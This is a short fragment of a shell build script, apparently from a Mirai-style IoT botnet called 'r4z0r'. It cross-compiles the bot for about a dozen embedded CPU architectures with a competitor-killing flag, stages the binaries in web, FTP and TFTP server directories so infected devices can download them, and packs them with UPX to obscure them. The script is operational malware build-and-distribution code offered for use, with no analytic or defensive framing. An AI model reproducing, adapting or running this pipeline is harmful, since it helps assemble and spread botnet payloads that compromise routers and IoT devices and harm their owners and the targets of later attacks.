...
compile_bot i586 r4z0r.x86 "-static -DCUM_KILLER"
compile_bot mips r4z0r.mips "-static -DCUM_KILLER"
compile_bot mipsel r4z0r.mpsl "-static -DCUM_KILLER"
compile_bot armv4l r4z0r.arm "-static -DCUM_KILLER"
compile_bot armv5l r4z0r.arm5 ""
compile_bot armv6l r4z0r.arm6 "-static -DCUM_KILLER"
compile_bot armv7l r4z0r.arm7 "-static -DCUM_KILLER"
compile_bot powerpc r4z0r.ppc "-static -DCUM_KILLER"
compile_bot sparc r4z0r.spc "-static -DCUM_KILLER"
compile_bot m68k r4z0r.m68k "-static -DCUM_KILLER"
compile_bot sh4 r4z0r.sh4 "-static -DCUM_KILLER"

cp release/r4z0r.* /var/www/html/razor
cp release/r4z0r.* /var/ftp
mv release/r4z0r.* /var/lib/tftpboot
rm -rf release
...
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/razor/*
